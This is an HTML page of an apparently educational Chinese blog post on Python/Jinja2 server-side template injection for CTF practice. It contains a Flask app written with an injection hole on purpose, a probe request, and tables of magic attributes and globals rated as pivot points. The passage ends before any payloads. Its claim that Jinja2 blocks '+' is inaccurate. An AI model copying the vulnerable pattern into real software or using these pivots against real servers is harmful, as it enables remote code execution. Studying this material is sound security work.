<!doctype html>














<!-- `site.alt_lang` can specify a language different from the UI -->
<html lang="zh" >
  <head>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <meta name="theme-color" media="(prefers-color-scheme: light)" content="#f7f7f7">
  <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#1b1b1e">
  <meta name="mobile-web-app-capable" content="yes">
  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
  <meta
    name="viewport"
    content="width=device-width, user-scalable=no initial-scale=1, shrink-to-fit=no, viewport-fit=cover"
  ><!-- Setup Open Graph image -->

  

  <!-- Begin Jekyll SEO tag v2.8.0 -->
<meta name="generator" content="Jekyll v4.4.1" />
<meta property="og:title" content="Python SSTI研究" />
<meta name="author" content="lamaper" />
<meta property="og:locale" content="zh" />
<meta name="description" content="对CTF中基于Python（尤其是Jinja2）的模板引擎的注入研究" />
<meta property="og:description" content="对CTF中基于Python（尤其是Jinja2）的模板引擎的注入研究" />
<link rel="canonical" href="/posts/py-ssti/" />
<meta property="og:url" content="/posts/py-ssti/" />
<meta property="og:site_name" content="lamaper" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2025-10-16T12:54:21+08:00" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="Python SSTI研究" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"lamaper","url":"https://github.com/lamaper/"},"dateModified":"2025-10-16T12:54:21+08:00","datePublished":"2025-10-16T12:54:21+08:00","description":"对CTF中基于Python（尤其是Jinja2）的模板引擎的注入研究","headline":"Python SSTI研究","mainEntityOfPage":{"@type":"WebPage","@id":"/posts/py-ssti/"},"url":"/posts/py-ssti/"}</script>
<!-- End Jekyll SEO tag -->


  <title>Python SSTI研究 | lamaper
  </title>

  <!--
  The Favicons for Web, Android, Microsoft, and iOS (iPhone and iPad) Apps
  Generated by: https://realfavicongenerator.net/
-->



<link rel="icon" type="image/png" href="/assets/img/favicons/favicon-96x96.png" sizes="96x96">
<link rel="icon" type="image/svg+xml" href="/assets/img/favicons/favicon.svg">
<link rel="shortcut icon" href="/assets/img/favicons/favicon.ico">
<link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png">

  <link rel="manifest" href="/assets/img/favicons/site.webmanifest">



  <!-- Resource Hints -->
  
    
      
        <link rel="preconnect" href="https://fonts.googleapis.com" >
      
        <link rel="dns-prefetch" href="https://fonts.googleapis.com" >
      
    
      
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
      
        <link rel="dns-prefetch" href="https://fonts.gstatic.com" >
      
    
      
        <link rel="preconnect" href="https://cdn.jsdelivr.net" >
      
        <link rel="dns-prefetch" href="https://cdn.jsdelivr.net" >
      
    
  

  <!-- Bootstrap -->
  
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.8/dist/css/bootstrap.min.css">
  

  <!-- Theme style -->
  <link rel="stylesheet" href="/assets/css/jekyll-theme-chirpy.css">

  <!-- Web Font -->
  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400&family=Source+Sans+Pro:wght@400;600;700;900&display=swap">

  <!-- Font Awesome Icons -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.1.0/css/all.min.css">

  <!-- 3rd-party Dependencies -->

  
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/tocbot@4.36.4/dist/tocbot.min.css">
  

  
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.min.css">
  

  
    <!-- Image Popup -->
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/glightbox@3.3.0/dist/css/glightbox.min.css">
  

  <!-- Scripts -->

  <script src="/assets/js/dist/theme.min.js"></script>

  <!-- JS selector for site. -->

<!-- commons -->



<!-- layout specified -->


  

  
    <!-- image lazy-loading & popup & clipboard -->
    
  















  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  



  <script defer src="https://cdn.jsdelivr.net/combine/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js,npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.umd.min.js,npm/glightbox@3.3.0/dist/js/glightbox.min.js,npm/clipboard@2.0.11/dist/clipboard.min.js,npm/dayjs@1.11.18/dayjs.min.js,npm/dayjs@1.11.18/locale/en.js,npm/dayjs@1.11.18/plugin/relativeTime.js,npm/dayjs@1.11.18/plugin/localizedFormat.js,npm/tocbot@4.36.4/dist/tocbot.min.js,npm/mermaid@11.12.0/dist/mermaid.min.js"></script>







<script defer src="/assets/js/dist/post.min.js"></script>


  <!-- MathJax -->
  <script src="/assets/js/data/mathjax.js"></script>
  <script async src="https://cdnjs.cloudflare.com/polyfill/v3/polyfill.min.js?features=es6"></script>
  <script id="MathJax-script" async src="https://cdn.jsdelivr.net/npm/mathjax@3.2.2/es5/tex-chtml.js"></script>


<!-- Pageviews -->

  

  



  

  <!-- A placeholder to allow defining custom metadata -->

</head>


  <body>
    <!-- The Side Bar -->

<aside aria-label="Sidebar" id="sidebar" class="d-flex flex-column align-items-end">
  <header class="profile-wrapper">
    <a href="/" id="avatar" class="rounded-circle"><img src="https://avatars.githubusercontent.com/u/108182318?v=4" width="112" height="112" alt="avatar" onerror="this.style.display='none'"></a>

    <a class="site-title d-block" href="/">lamaper</a>
    <p class="site-subtitle fst-italic mb-0">Web / CTF / Coding</p>
  </header>
  <!-- .profile-wrapper -->

  <nav class="flex-column flex-grow-1 w-100 ps-0">
    <ul class="nav">
      <!-- home -->
      <li class="nav-item">
        <a href="/" class="nav-link">
          <i class="fa-fw fas fa-home"></i>
          <span>HOME</span>
        </a>
      </li>
      <!-- the real tabs -->
      
        <li class="nav-item">
          <a href="/categories/" class="nav-link">
            <i class="fa-fw fas fa-stream"></i>
            

            <span>CATEGORIES</span>
          </a>
        </li>
        <!-- .nav-item -->
      
        <li class="nav-item">
          <a href="/tags/" class="nav-link">
            <i class="fa-fw fas fa-tags"></i>
            

            <span>TAGS</span>
          </a>
        </li>
        <!-- .nav-item -->
      
        <li class="nav-item">
          <a href="/archives/" class="nav-link">
            <i class="fa-fw fas fa-archive"></i>
            

            <span>ARCHIVES</span>
          </a>
        </li>
        <!-- .nav-item -->
      
        <li class="nav-item">
          <a href="/about/" class="nav-link">
            <i class="fa-fw fas fa-info-circle"></i>
            

            <span>ABOUT</span>
          </a>
        </li>
        <!-- .nav-item -->
      
    </ul>
  </nav>

  <div class="sidebar-bottom d-flex flex-wrap  align-items-center w-100">
    
      <button type="button" class="btn btn-link nav-link" aria-label="Switch Mode" id="mode-toggle">
        <i class="fas fa-adjust"></i>
      </button>

      
        <span class="icon-border"></span>
      
    

    

      
        <a
          href="https://github.com/lamaper"
          aria-label="github"
          

          
            target="_blank"
            
          

          

          
            rel="noopener noreferrer"
          
        >
          <i class="fab fa-github"></i>
        </a>
      
    

      
        <a
          href="javascript:location.href = 'mailto:' + ['lamaper','qq.com'].join('@')"
          aria-label="email"
          

          

          

          
        >
          <i class="fas fa-envelope"></i>
        </a>
      
    
          
        

      
        <a
          href="/feed.xml"
          aria-label="rss"
          

          

          

          
        >
          <i class="fas fa-rss"></i>
        </a>
      
    
  </div>
  <!-- .sidebar-bottom -->
</aside>
<!-- #sidebar -->


    <div id="main-wrapper" class="d-flex justify-content-center">
      <div class="container d-flex flex-column px-xxl-5">
        <!-- The Top Bar -->

<header id="topbar-wrapper" class="flex-shrink-0" aria-label="Top Bar">
  <div
    id="topbar"
    class="d-flex align-items-center justify-content-between px-lg-3 h-100"
  >
    <nav id="breadcrumb" aria-label="Breadcrumb">
      

      
        
          
            <span>
              <a href="/">Home</a>
            </span>

          
        
          
        
          
            
              <span>Python SSTI研究</span>
            

          
        
      
    </nav>
    <!-- endof #breadcrumb -->

    <button type="button" id="sidebar-trigger" class="btn btn-link" aria-label="Sidebar">
      <i class="fas fa-bars fa-fw"></i>
    </button>

    <div id="topbar-title">
      Post
    </div>

    <button type="button" id="search-trigger" class="btn btn-link" aria-label="Search">
      <i class="fas fa-search fa-fw"></i>
    </button>

    <search id="search" class="align-items-center ms-3 ms-lg-0">
      <i class="fas fa-search fa-fw"></i>
      <input
        class="form-control"
        id="search-input"
        type="search"
        aria-label="search"
        autocomplete="off"
        placeholder="Search..."
      >
    </search>
    <button type="button" class="btn btn-link text-decoration-none" id="search-cancel">Cancel</button>
  </div>
</header>


        <div class="row flex-grow-1">
          <main aria-label="Main Content" class="col-12 col-lg-11 col-xl-9 px-md-4">
            
              <!-- Refactor the HTML structure -->



<!--
  In order to allow a wide table to scroll horizontally,
  we suround the markdown table with `<div class="table-wrapper">` and `</div>`
-->



<!--
  Fixed kramdown code highlight rendering:
  https://github.com/penibelst/jekyll-compress-html/issues/101
  https://github.com/penibelst/jekyll-compress-html/issues/71#issuecomment-188144901
-->



<!-- Change the icon of checkbox -->



<!-- Handle images -->





<!-- Add header for code snippets -->



<!-- Create heading anchors -->





  
  

  
    
    

    
      
        
        
      

      
      

      
      
      

      
    

    
  

  
  

  
    
    

    
      
        
        
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    

    
  

  
  

  
    
    

    
      
        
        
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    

    
  

  
  

  
    
    

    
      
        
        
      

      
      

      
      
      

      
    

    
  




<!-- return -->










<article class="px-1" data-toc="true">
  <header>
    <h1 data-toc-skip>Python SSTI研究</h1>
    
      <p class="post-desc fw-light mb-4">对CTF中基于Python（尤其是Jinja2）的模板引擎的注入研究</p>
    

    <div class="post-meta text-muted">
      <!-- published date -->
      <span>
        Posted
        <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1760590461"
  data-df="ll"
  
    data-bs-toggle="tooltip" data-bs-placement="bottom"
  
>
  Oct 16, 2025
</time>

      </span>

      <!-- lastmod date -->
      

      

      <div class="d-flex justify-content-between">
        <!-- author(s) -->
        <span>
          

          By

          <em>
            
              
                <a href="https://github.com/lamaper/">lamaper</a>
                
              
            
          </em>
        </span>

        <div>
          <!-- pageviews -->
          

          <!-- read time -->
          <!-- Calculate the post's reading time, and display the word count in tooltip -->



<!-- words per minute -->










<!-- return element -->
<span
  class="readtime"
  data-bs-toggle="tooltip"
  data-bs-placement="bottom"
  title="4261 words"
>
  <em>23 min</em> read</span>

        </div>
      </div>
    </div>
  </header>

  
    <div id="toc-bar" class="d-flex align-items-center justify-content-between invisible">
      <span class="label text-truncate">Python SSTI研究</span>
      <button type="button" class="toc-trigger btn me-1">
        <i class="fa-solid fa-list-ul fa-fw"></i>
      </button>
    </div>

    <button id="toc-solo-trigger" type="button" class="toc-trigger btn btn-outline-secondary btn-sm">
      <span class="label ps-2 pe-1">Contents</span>
      <i class="fa-solid fa-angle-right fa-fw"></i>
    </button>

    <dialog id="toc-popup" class="p-0">
      <div class="header d-flex flex-row align-items-center justify-content-between">
        <div class="label text-truncate py-2 ms-4">Python SSTI研究</div>
        <button id="toc-popup-close" type="button" class="btn mx-1 my-1 opacity-75">
          <i class="fas fa-close"></i>
        </button>
      </div>
      <div id="toc-popup-content" class="px-4 py-3 pb-4"></div>
    </dialog>
  

  <div class="content">
    
<h2 id="ssti"><span class="me-2">SSTI</span><a href="#ssti" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<p>在Python中，SSTI经常与jinja2、Django、Mako、Tornado等模版引擎结合，其核心思想是利用模板引擎的核心机制和应用程序将不安全输入传递给模板的方式构造合适的payload以获取风险函数，如popen、system、eval等。</p>

<h3 id="模版引擎"><span class="me-2">模版引擎</span><a href="#模版引擎" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>Python的模版引擎大多采用相同的语法结构，<code class="language-plaintext highlighter-rouge">{% ... %}</code> 和 <code class="language-plaintext highlighter-rouge">{{ ... }}</code> 。前者用于执行诸如 for 循环或赋值的语句，后者把表达式的结果打印到模板上。</p>

<p>在本地编写一个含有SSTI漏洞的测试环境：</p>

<div class="language-python highlighter-rouge"><div class="code-header">
        <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre></td><td class="rouge-code"><pre><span class="kn">from</span> <span class="n">flask</span> <span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">request</span><span class="p">,</span> <span class="n">render_template_string</span>

<span class="n">app</span> <span class="o">=</span> <span class="nc">Flask</span><span class="p">(</span><span class="n">__name__</span><span class="p">)</span>

<span class="nd">@app.route</span><span class="p">(</span><span class="sh">'</span><span class="s">/</span><span class="sh">'</span><span class="p">)</span>
<span class="k">def</span> <span class="nf">hello_world</span><span class="p">():</span> 
    <span class="n">person</span> <span class="o">=</span> <span class="sh">'</span><span class="s">lmpr</span><span class="sh">'</span>
    <span class="k">if</span> <span class="n">request</span><span class="p">.</span><span class="n">args</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">name</span><span class="sh">'</span><span class="p">):</span>
        <span class="n">person</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">args</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">name</span><span class="sh">'</span><span class="p">)</span>
    <span class="n">template</span> <span class="o">=</span> <span class="sh">'</span><span class="s">&lt;h1&gt;Hi, %s.&lt;/h1&gt;</span><span class="sh">'</span> <span class="o">%</span> <span class="n">person</span>
    <span class="k">return</span> <span class="nf">render_template_string</span><span class="p">(</span><span class="n">template</span><span class="p">)</span>

<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="sh">'</span><span class="s">__main__</span><span class="sh">'</span><span class="p">:</span>
    <span class="n">app</span><span class="p">.</span><span class="nf">run</span><span class="p">()</span>
</pre></td></tr></tbody></table></code></div></div>

<p>并命名为<code class="language-plaintext highlighter-rouge">app.py</code>，在当前地址启动服务：</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>python <span class="nt">-m</span> flask run
</pre></td></tr></tbody></table></code></div></div>

<p>在<code class="language-plaintext highlighter-rouge">http://localhost:5000</code>中可以看到页面，当前显示：</p>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>Hi, lmpr.
</pre></td></tr></tbody></table></code></div></div>

<p>如果对name传入参数，服务器会给出新的渲染结果，一个测试可以知道这里有没有模版注入漏洞，如果我们请求：</p>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>http://localhost:5000?name={{2*2}}
</pre></td></tr></tbody></table></code></div></div>

<p>如果返回：</p>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>Hi, 4.
</pre></td></tr></tbody></table></code></div></div>

<p>说明传入的内容被当做模版引擎语言进行解析和运算，这就意味着这里可能存在SSTI。</p>

<p>需要注意的是，jinja2原生屏蔽符号<code class="language-plaintext highlighter-rouge">+</code>，测试时不要使用<code class="language-plaintext highlighter-rouge">{{1+1}}</code>等语句。</p>

<h3 id="python语言特性"><span class="me-2">Python语言特性</span><a href="#python语言特性" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>Python认为万物皆为对象，这就为我们构造payload以利用SSTI提供了条件。Python是典型的面向对象语言，面向对象的特性就是封装、多态、继承。在构造payload中我们常用封装与继承。</p>

<p>Python认为所有类都有一个顶层基类<code class="language-plaintext highlighter-rouge">&lt;class 'Object'&gt;</code>，或者说所有类都直接或间接地是Object的子类。</p>

<p>每一个对象都有自己的“属性”，也就是变量。类实例化后的对象还有“方法”，也就是类中的函数。我们知道可以通过<code class="language-plaintext highlighter-rouge">Obj.func()</code>的方法来调用函数，<code class="language-plaintext highlighter-rouge">Obj.var</code>的方式来调用属性。</p>

<p>在Python中，每个类都有自己的内置属性，或者“魔术属性”，部分类有内置的“魔术方法”，他们不需要被显式的声明，在被实例化的时候就已经存在。</p>

<p>在 Python SSTI攻击与防御中，理解魔术属性和魔术方法至关重要。这些特殊成员是攻击者利用对象链进行沙箱逃逸的核心工具，也是防御者需要重点监控和限制的关键点。</p>

<h4 id="常用的魔术属性"><span class="me-2">常用的魔术属性</span><a href="#常用的魔术属性" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4>

<div class="table-wrapper"><table>
  <thead>
    <tr>
      <th><strong>属性</strong></th>
      <th><strong>作用</strong></th>
      <th><strong>SSTI 风险</strong></th>
      <th><strong>示例</strong></th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">__class__</code></td>
      <td>获取对象的类</td>
      <td>一般的类对象攻击链起点，获取类对象</td>
      <td><code class="language-plaintext highlighter-rouge">''.__class__</code>→ <code class="language-plaintext highlighter-rouge">&lt;class 'str'&gt;</code></td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">__bases__</code></td>
      <td>获取类的基类元组</td>
      <td>访问继承树</td>
      <td><code class="language-plaintext highlighter-rouge">str.__bases__</code>→ <code class="language-plaintext highlighter-rouge">(&lt;class 'object'&gt;,)</code></td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">__base__</code></td>
      <td>获取第一个基类</td>
      <td>快速访问基类</td>
      <td><code class="language-plaintext highlighter-rouge">str.__base__</code>→ <code class="language-plaintext highlighter-rouge">&lt;class 'object'&gt;</code></td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">__mro__</code></td>
      <td>方法解析顺序（继承链）</td>
      <td>遍历继承关系</td>
      <td><code class="language-plaintext highlighter-rouge">str.__mro__</code>→ <code class="language-plaintext highlighter-rouge">(str, object)</code></td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">__subclasses__()</code></td>
      <td>获取类的直接子类列表</td>
      <td><strong>极高危</strong>，访问所有加载的类</td>
      <td><code class="language-plaintext highlighter-rouge">object.__subclasses__()</code></td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">__mro__</code></td>
      <td>方法解析顺序（继承链）</td>
      <td>遍历继承关系</td>
      <td><code class="language-plaintext highlighter-rouge">str.__mro__</code>→ <code class="language-plaintext highlighter-rouge">(str, object)</code></td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">__globals__</code></td>
      <td>获取函数所在模块的全局变量字典</td>
      <td><strong>极高危</strong>，访问模块全局变量</td>
      <td><code class="language-plaintext highlighter-rouge">func.__globals__</code></td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">__closure__</code></td>
      <td>获取函数的闭包变量</td>
      <td>访问外层作用域变量</td>
      <td><code class="language-plaintext highlighter-rouge">func.__closure__[0].cell_contents</code></td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">__code__</code></td>
      <td>获取函数的字节码对象</td>
      <td>泄露代码信息</td>
      <td><code class="language-plaintext highlighter-rouge">func.__code__.co_filename</code></td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">__builtins__</code></td>
      <td>内置函数和异常的集合</td>
      <td><strong>极高危</strong>，访问危险函数</td>
      <td><code class="language-plaintext highlighter-rouge">__builtins__.__import__</code></td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">__package__</code></td>
      <td>获取模块所属包名</td>
      <td>泄露包结构信息</td>
      <td><code class="language-plaintext highlighter-rouge">os.__package__</code></td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">__spec__</code></td>
      <td>获取模块规范对象</td>
      <td>泄露模块信息</td>
      <td><code class="language-plaintext highlighter-rouge">os.__spec__.origin</code></td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">__name__</code></td>
      <td>获取类/函数/模块名</td>
      <td>识别关键对象</td>
      <td><code class="language-plaintext highlighter-rouge">os.__name__</code></td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">__qualname__</code></td>
      <td>获取限定名称</td>
      <td>识别嵌套对象</td>
      <td><code class="language-plaintext highlighter-rouge">Class.Method.__qualname__</code></td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">__module__</code></td>
      <td>获取定义模块名</td>
      <td>定位模块来源</td>
      <td><code class="language-plaintext highlighter-rouge">func.__module__</code></td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">__doc__</code></td>
      <td>获取文档字符串</td>
      <td>泄露实现细节</td>
      <td><code class="language-plaintext highlighter-rouge">os.system.__doc__</code></td>
    </tr>
  </tbody>
</table></div>

<p>其中我们最常用的就是<code class="language-plaintext highlighter-rouge">__globals__</code>和<code class="language-plaintext highlighter-rouge">__import__</code>。</p>

<p><code class="language-plaintext highlighter-rouge">__globals__</code>实际是函数闭包机制的副产品。在Python编译函数时，会将函数所需的外部变量引用存储在<code class="language-plaintext highlighter-rouge">__globals__</code>中。它存在的意义是当函数访问非局部变量时，Python 需要知道去哪里查找，一个典型的<code class="language-plaintext highlighter-rouge">__globals__</code>可以形如：</p>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
</pre></td><td class="rouge-code"><pre>{
    # === 系统自动添加 ===
    '__name__': 'my_module',
    '__doc__': None,
    '__package__': '',
    '__loader__': &lt;_frozen_importlib_external.SourceFileLoader&gt;,
    '__spec__': ModuleSpec(...),
    '__file__': '/project/my_module.py',
    '__cached__': '/project/__pycache__/my_module.cpython-38.pyc',
    '__builtins__': &lt;module 'builtins'&gt;,
    
    # === 用户显式导入 ===
    'os': &lt;module 'os' from '/usr/lib/python3.8/os.py'&gt;,
    'sys': &lt;module 'sys' (built-in)&gt;,
    'flask': &lt;module 'flask' from '...'&gt;,
    
    # === 用户定义内容 ===
    'APP_CONFIG': {'SECRET_KEY': '114514'},  
    'db_connection': &lt;Connection object&gt;,    
    'logger': &lt;Logger my_module (WARNING)&gt;,
    
    # === 函数和类 ===
    'my_function': &lt;function my_function at 0x7f8e1c2b5ca0&gt;,
    'HelperClass': &lt;class 'my_module.HelperClass'&gt;
}
</pre></td></tr></tbody></table></code></div></div>

<h4 id="常用的魔术方法"><span class="me-2">常用的魔术方法</span><a href="#常用的魔术方法" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4>

<div class="table-wrapper"><table>
  <thead>
    <tr>
      <th><strong>方法</strong></th>
      <th><strong>调用时机</strong></th>
      <th><strong>SSTI 风险</strong></th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">__new__(cls)</code></td>
      <td>创建新实例时</td>
      <td>控制对象创建过程</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">__init__(self)</code></td>
      <td>对象初始化时</td>
      <td>访问初始化上下文</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">__del__(self)</code></td>
      <td>对象销毁时</td>
      <td>潜在后门入口</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">__getattribute__(self, name)</code></td>
      <td><strong>所有</strong>属性访问时</td>
      <td>属性访问总入口</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">__getattr__(self, name)</code></td>
      <td>属性不存在时</td>
      <td>动态属性处理</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">__setattr__(self, name, value)</code></td>
      <td>设置属性时</td>
      <td>修改对象状态</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">__dir__(self)</code></td>
      <td><code class="language-plaintext highlighter-rouge">dir()</code>调用时</td>
      <td>泄露可用属性</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">__call__(self)</code></td>
      <td>对象被调用时</td>
      <td>使任意对象可调用</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">__func__</code></td>
      <td>获取函数对象</td>
      <td>访问底层函数</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">__closure__</code></td>
      <td>访问闭包变量</td>
      <td>获取外层变量</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">__enter__(self)</code></td>
      <td>进入上下文时</td>
      <td>返回有风险的对象</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">__exit__(self)</code></td>
      <td>退出上下文时</td>
      <td>清理操作可能被利用</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">__import__(name)</code></td>
      <td>动态导入模块</td>
      <td><strong>极高危</strong>，RCE核心</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">__reduce__(self)</code></td>
      <td>序列化对象时</td>
      <td>构造恶意序列化</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">__getstate__</code>/<code class="language-plaintext highlighter-rouge">__setstate__</code></td>
      <td>序列化控制</td>
      <td>篡改序列化状态</td>
    </tr>
  </tbody>
</table></div>

<h3 id="常用全局对象"><span class="me-2">常用全局对象</span><a href="#常用全局对象" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>一些常见的，可在全局被调用的函数和对象可能成为我们构造payload的起点：</p>

<div class="table-wrapper"><table>
  <thead>
    <tr>
      <th><strong>函数</strong></th>
      <th><strong>来源</strong></th>
      <th><strong>利用方式</strong></th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">lipsum</code></td>
      <td>Jinja2</td>
      <td>经典跳板函数</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">range</code></td>
      <td>Python内置</td>
      <td>生成序列用于遍历</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">dict</code></td>
      <td>Python内置</td>
      <td>创建字典对象</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">cycler</code></td>
      <td>Jinja2</td>
      <td>循环生成器</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">joiner</code></td>
      <td>Jinja2</td>
      <td>字符串连接器</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">namespace</code></td>
      <td>Jinja2</td>
      <td>创建命名空间</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">url_for</code></td>
      <td>Flask</td>
      <td>高危跳板函数</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">get_flashed_messages</code></td>
      <td>Flask</td>
      <td>类似跳板</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">config</code></td>
      <td>Flask</td>
      <td><strong>极高危</strong>，直接访问配置</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">request</code></td>
      <td>Flask</td>
      <td>请求对象，泄露请求信息</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">session</code></td>
      <td>Flask</td>
      <td>会话对象，读取/篡改会话</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">g</code></td>
      <td>Flask</td>
      <td>访问上下文</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">current_app</code></td>
      <td>Flask</td>
      <td>应用实例，<strong>高危</strong>，访问应用核心</td>
    </tr>
  </tbody>
</table></div>

<h3 id="payload构造"><span class="me-2">Payload构造</span><a href="#payload构造" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>首先要选取一个可以获取的全局对象，我们以<code class="language-plaintext highlighter-rouge">lipsum</code>、<code class="language-plaintext highlighter-rouge">config</code>、<code class="language-plaintext highlighter-rouge">" "</code>分别为例。</p>

